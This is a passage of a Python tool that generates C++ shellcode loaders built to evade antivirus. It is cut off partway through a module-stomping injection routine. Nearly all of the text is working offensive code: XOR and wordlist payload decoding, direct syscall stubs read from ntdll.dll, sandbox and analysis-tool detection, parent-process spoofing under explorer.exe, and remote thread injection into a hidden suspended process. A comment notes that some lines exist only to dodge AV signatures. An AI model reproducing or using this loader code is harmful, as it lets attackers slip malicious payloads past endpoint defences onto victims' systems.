#!/usr/bin/python3
#Created by Matthew David (@icyguider)
import sys, os, argparse, random, string, re, struct, pefile
import os.path
import urllib.request

inspiration = """
┳┻|
┻┳|
┳┻|
┻┳|
┳┻| _
┻┳| •.•)  - Shhhhh, AV might hear us! 
┳┻|⊂ﾉ   
┻┳|
"""

stub = """
#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>
#include "skCrypter.h"
REPLACE_ME_SYSCALL_INCLUDE
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

REPLACE_ME_SHELLCODE_VARS

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

REPLACE_SAFEPRINT_FUNCTIONS

REPLACE_GetSyscallStubP1

REPLACE_SANDBOX_CHECK

REPLACE_PROCESS_FUNCTIONS

REPLACE_DECODE_FUNCTION

int main()
{
    REPLACE_STUB_METHOD
}

REPLACE_DLL_MAIN
"""

regularShellcode = """
REPLACE_ME_PAYLOAD

SIZE_T payload_len = sizeof(payload);

unsigned char* decoded = (unsigned char*)malloc(payload_len);
"""

wordShellcode = """
REPLACE_ME_WORDLIST

REPLACE_ME_FILEWORDS

int wordsLength = sizeof(words)/sizeof(words[0]);
SIZE_T payload_len = sizeof(filewords)/sizeof(filewords[0]);

unsigned char* decoded = (unsigned char*)malloc(payload_len);
"""

regularDecode = """
int deC(unsigned char payload[])
{
    std::string key;
    key = skCrypt("REPLACE_ME_KEY");
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key.length(); z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    key.clear();
    return 0;
}
"""

wordDecode = """
int deC()
{
    for (int i=0; i < payload_len; i++)
    {
        char* test = filewords[i];
        int i2 = 0;
        while (i2 < wordsLength)
        {
            if (words[i2] == test) {
                break;
            }
            i2++;
        }
        char ci = i2;
        decoded[i] = ci;
    }
    return 0;
}
"""

# This can be used to remove strings from memory. Currently breaks when used with ollvm
safePrint = """
int safe_print(auto msg)
{
    printf(msg);
    printf("\\n");
    msg.clear();
    return 0;
}

int safe_print(auto msg, NTSTATUS res)
{
    printf(msg);
    printf("0x%x\\n", res);
    msg.clear();
    return 0;
}
"""

GetSyscallStubP1 = """
typedef VOID(KNORMAL_ROUTINE) (
    IN PVOID NormalContext,
    IN PVOID SystemArgument1,
    IN PVOID SystemArgument2);

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

int const SYSCALL_STUB_SIZE = 23;
using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
using myNtProtectVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
using myNtResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
using myNtWaitForSingleObject = NTSTATUS(NTAPI*)(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut);
using myNtQueryInformationProcess = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
using myNtReadVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);
using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
using myNtQueueApcThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PKNORMAL_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
using myNtAlertResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
using myNtGetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
using myNtSetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT Context);
using myNtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

myNtAllocateVirtualMemory NtAllocateVirtualMemory;
myNtWriteVirtualMemory NtWriteVirtualMemory;
myNtProtectVirtualMemory NtProtectVirtualMemory;
myNtCreateThreadEx NtCreateThreadEx;
myNtResumeThread NtResumeThread;
myNtWaitForSingleObject NtWaitForSingleObject;
myNtQueryInformationProcess NtQueryInformationProcess;
myNtReadVirtualMemory NtReadVirtualMemory;
myNtClose NtClose;
myNtOpenProcess NtOpenProcess;
myNtQueueApcThread NtQueueApcThread;
myNtAlertResumeThread NtAlertResumeThread;
myNtGetContextThread NtGetContextThread;
myNtSetContextThread NtSetContextThread;
myNtDelayExecution NtDelayExecution;

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
        return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(String functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
        PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
        PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
        BOOL stubFound = FALSE;

        for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
        {
                DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
                DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
                LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
                if (strcmp(functionNameResolved, functionName.c_str()) == 0)
                {
                        memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
                        stubFound = TRUE;
                }
        }

        return stubFound;
}
"""

GetSyscallStubP2 = """
    DWORD tProcess2 = GetCurrentProcessId();
    HANDLE pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2);

    HANDLE syscallStub_NtAllocateVirtualMemory = VirtualAllocEx(pHandle2, NULL, (SIZE_T)SYSCALL_STUB_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    HANDLE syscallStub_NtWriteVirtualMemory = static_cast<char*>(syscallStub_NtAllocateVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtProtectVirtualMemory = static_cast<char*>(syscallStub_NtWriteVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtCreateThreadEx = static_cast<char*>(syscallStub_NtProtectVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtResumeThread = static_cast<char*>(syscallStub_NtCreateThreadEx) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtWaitForSingleObject = static_cast<char*>(syscallStub_NtResumeThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtQueryInformationProcess = static_cast<char*>(syscallStub_NtWaitForSingleObject) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtReadVirtualMemory = static_cast<char*>(syscallStub_NtQueryInformationProcess) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtClose = static_cast<char*>(syscallStub_NtReadVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtOpenProcess = static_cast<char*>(syscallStub_NtClose) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtQueueApcThread = static_cast<char*>(syscallStub_NtOpenProcess) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtAlertResumeThread = static_cast<char*>(syscallStub_NtQueueApcThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtGetContextThread = static_cast<char*>(syscallStub_NtAlertResumeThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtSetContextThread = static_cast<char*>(syscallStub_NtGetContextThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtDelayExecution = static_cast<char*>(syscallStub_NtSetContextThread) + SYSCALL_STUB_SIZE;

    char syscallStub[SYSCALL_STUB_SIZE] = {};
    DWORD oldProtection = 0;
    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;

    // define NtAllocateVirtualMemory
    NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)syscallStub_NtAllocateVirtualMemory;
    VirtualProtect(syscallStub_NtAllocateVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtWriteVirtualMemory
    NtWriteVirtualMemory = (myNtWriteVirtualMemory)syscallStub_NtWriteVirtualMemory;
    VirtualProtect(syscallStub_NtWriteVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtProtectVirtualMemory
    NtProtectVirtualMemory = (myNtProtectVirtualMemory)syscallStub_NtProtectVirtualMemory;
    VirtualProtect(syscallStub_NtProtectVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtCreateThreadEx
    NtCreateThreadEx = (myNtCreateThreadEx)syscallStub_NtCreateThreadEx;
    VirtualProtect(syscallStub_NtCreateThreadEx, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtResumeThread
    NtResumeThread = (myNtResumeThread)syscallStub_NtResumeThread;
    VirtualProtect(syscallStub_NtResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtWaitForSingleObject
    NtWaitForSingleObject = (myNtWaitForSingleObject)syscallStub_NtWaitForSingleObject;
    VirtualProtect(syscallStub_NtWaitForSingleObject, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtQueryInformationProcess
    NtQueryInformationProcess = (myNtQueryInformationProcess)syscallStub_NtQueryInformationProcess;
    VirtualProtect(syscallStub_NtQueryInformationProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtReadVirtualMemory
    NtReadVirtualMemory = (myNtReadVirtualMemory)syscallStub_NtReadVirtualMemory;
    VirtualProtect(syscallStub_NtReadVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtClose
    NtClose = (myNtClose)syscallStub_NtClose;
    VirtualProtect(syscallStub_NtClose, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtOpenProcess
    NtOpenProcess = (myNtOpenProcess)syscallStub_NtOpenProcess;
    VirtualProtect(syscallStub_NtOpenProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtQueueApcThread
    NtQueueApcThread = (myNtQueueApcThread)syscallStub_NtQueueApcThread;
    VirtualProtect(syscallStub_NtQueueApcThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtAlertResumeThread
    NtAlertResumeThread = (myNtAlertResumeThread)syscallStub_NtAlertResumeThread;
    VirtualProtect(syscallStub_NtAlertResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtGetContextThread
    NtGetContextThread = (myNtGetContextThread)syscallStub_NtGetContextThread;
    VirtualProtect(syscallStub_NtGetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtSetContextThread
    NtSetContextThread = (myNtSetContextThread)syscallStub_NtSetContextThread;
    VirtualProtect(syscallStub_NtSetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define syscallStub_NtDelayExecution
    NtDelayExecution = (myNtDelayExecution)syscallStub_NtDelayExecution;
    VirtualProtect(syscallStub_NtDelayExecution, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);


    file = CreateFileA("c:\\\\windows\\\\system32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
    DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
    PIMAGE_SECTION_HEADER textSection = section;
    PIMAGE_SECTION_HEADER rdataSection = section;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
    {
            if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
                    rdataSection = section;
                    break;
            }
            section++;
    }

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

    String scall = std::string("N") + "t" + "A" + "l" + "l" + "o" + "c" + "a" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    BOOL StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAllocateVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "W" + "r" + "i" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWriteVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtProtectVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "C" + "r" + "e" + "a" + "t" + "e" + "T" + "h" + "r" + "e" + "a" + "d" + "E" + "x";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtCreateThreadEx);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtResumeThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "W" + "a" + "i" + "t" + "F" + "o" + "r" + "S" + "i" + "n" + "g" + "l" + "e" + "O" + "b" + "j" + "e" + "c" + "t";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWaitForSingleObject);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "r" + "y" + "I" + "n" + "f" + "o" + "r" + "m" + "a" + "t" + "i" + "o" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueryInformationProcess);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "R" + "e" + "a" + "d" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtReadVirtualMemory);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "C" + "l" + "o" + "s" + "e";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtClose);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenProcess);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "u" + "e" + "A" + "p" + "c" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueueApcThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "A" + "l" + "e" + "r" + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAlertResumeThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "G" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtGetContextThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "S" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtSetContextThread);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "D" + "e" + "l" + "a" + "y" + "E" + "x" + "e" + "c" + "u" + "t" + "i" + "o" + "n";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtDelayExecution);
    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
"""

sandbox_check = """
//thanks @Cerbersec!
BOOL CheckSandbox() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    if (systemInfo.dwNumberOfProcessors < 2)
        return TRUE;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    if (memoryStatus.ullTotalPhys / 1024 / 1024 < 2048)
        return TRUE;

    ULONG64 timeBeforeSleep = GetTickCount64();
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * 60000;
    safe_print(skCrypt("Please wait 60 seconds..."));
    NtDelayExecution(FALSE, &delay);
    ULONG64 timeAfterSleep = GetTickCount64();
    if (timeAfterSleep - timeBeforeSleep < 60000)
        return TRUE;

    return FALSE;
}
"""

hostname_sanbox_check = """
int hostcheck()
{
    char hostname[64];
    DWORD hostnamesize = 64;
    GetComputerNameA(hostname, &hostnamesize);
    if (strcmp(hostname, skCrypt("REPLACE_ME_HOSTNAME")) != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

username_sanbox_check = """
int usercheck()
{
    char username[4000];
    DWORD usernameamesize = 4000;
    GetUserName(username, &usernameamesize);
    if (strcmp(username, skCrypt("REPLACE_ME_USERNAME")) != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

domain_sanbox_check = """
int domaincheck()
{
    char domain[164];
    DWORD domainsize = 164;
    GetComputerNameEx(ComputerNameDnsDomain, domain, &domainsize);
    if (strcmp(domain, skCrypt("REPLACE_ME_DOMAINNAME")) != 0) {
        exit (EXIT_FAILURE);
    }
    return 0;
}
"""

dll_sandbox_check = """
int PrintModules(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)processID;
    // Print the process identifier.
    //printf("\\nProcess ID: %u\\n", processID);
    // Get a handle to the process.
    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (NULL == hProcess)
        return 1;
    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];
            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                sizeof(szModName) / sizeof(TCHAR)))
            {
                //std::string target = L"Dbghelp.dll";
                String dang = szModName;
                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
                if (dang.find("SbieDll.dll") != std::string::npos || dang.find("Api_log.dll") != std::string::npos || dang.find("Dir_watch.dll") != std::string::npos || dang.find("dbghelp.dll") != std::string::npos)
                {
                    // Print the module name and handle value.
                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    return 2;
                }
                
            }
        }
    }
    // Release the handle to the process.
    NtClose(hProcess);
    return 0;
}

int getLoadedDlls()
{
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    DWORD cProcesses;
    unsigned int i;
    // Get the list of process identifiers.
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return 1;
    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);
    // Print the names of the modules for each process.
    int result;
    int done = 0;
    DWORD saved;
    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
    while (done != 2)
    {
        for (i = 0; i < cProcesses; i++)
        {
            result = PrintModules(aProcesses[i]);
            if (result == 2)
            {
                done = result;
                saved = aProcesses[i];
            }
        }
    }
    return 0;
}
"""

process_functions = """
HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);
    
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    REPLACE_PPID_SPOOF
    
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT | STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}
"""

module_stomping_stub = """
    REPLACE_ME_GetSyscallStubP2

    HANDLE processHandle;
    PVOID remoteBuffer;
    auto moduleToInject = skCrypt("mstscax.dll");
    auto moduleFunction = skCrypt("DllCanUnloadNow");
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;

    REPLACE_ME_SANDBOX_CALL
    deC(REPLACE_ME_DECARG);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    processHandle = pi.hProcess;

    LPVOID test = (LPVOID)GetProcAddress(LoadLibraryA(TEXT("Kernel32.dll")), skCrypt("LoadLibraryExA"));
    unsigned char adr[8];
    *(uintptr_t*)adr = (uintptr_t)test; 

    unsigned char shim[] =  {0x48, 0xB8, adr[0], adr[1], adr[2], adr[3], adr[4], adr[5], adr[6],adr[7],
            0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
            0x48, 0x31, 0xD2,
            0xFF, 0xE0};

    LPVOID allocModule = NULL;
    LPVOID allocShim = NULL;
    SIZE_T bytesWritten;
    HANDLE hThread;
    ULONG oldProtect = 0;
    SIZE_T moduleSize = sizeof(moduleToInject) + 2;
    SIZE_T shimSize = sizeof shim;

    res = NtAllocateVirtualMemory(processHandle, &allocModule, 0, &moduleSize, MEM_COMMIT | MEM_RESERVE, 0x40);
    safe_print(skCrypt("NtAllocateVirtualMemory res (allocModule): "), res);
    res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, 0x40);
    safe_print(skCrypt("NtAllocateVirtualMemory res (allocShim): "), res);
    
    auto eString = skCrypt("allocShim:   ");
    printf("%s%#p\\n", eString.decrypt(), allocShim);
    eString.clear();
    eString = skCrypt("allocModule: ");
    printf("%s%#p\\n", eString.decrypt(), allocModule);
    eString.clear();

    res = NtWriteVirtualMemory(processHandle, allocModule, moduleToInject, sizeof moduleToInject, &bytesWritten);
    safe_print(skCrypt("NtWriteVirtualMemory res (moduleToInject): "), res);
    res = NtWriteVirtualMemory(processHandle, allocShim, shim, shimSize, &bytesWritten);
    safe_print(skCrypt("NtWriteVirtualMemory res (Shim): "), res);
    if (res != 0)
    {
        safe_print(skCrypt("[!] NtWriteVirtualMemory FAILED! This happens occassionally due to an unkown bug."));
        return 1;
    }

    res = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, allocShim, allocModule, FALSE, 0, 0, 0, NULL);
    safe_print(skCrypt("NtCreateThreadEx res (Shim): "), res);
    res = NtWaitForSingleObject(hThread, -1, NULL);
    safe_print(skCrypt("NtWaitForSingleObject res (Shim): "), res);

    HMODULE xps = LoadLibraryExA(moduleToInject, NULL, DONT_RESOLVE_DLL_REFERENCES);
    LPVOID funcAddress = (LPVOID)GetProcAddress(xps, moduleFunction);

    eString = skCrypt("funcAddress: ");
    printf("%s%#p\\n", eString.decrypt(), funcAddress);
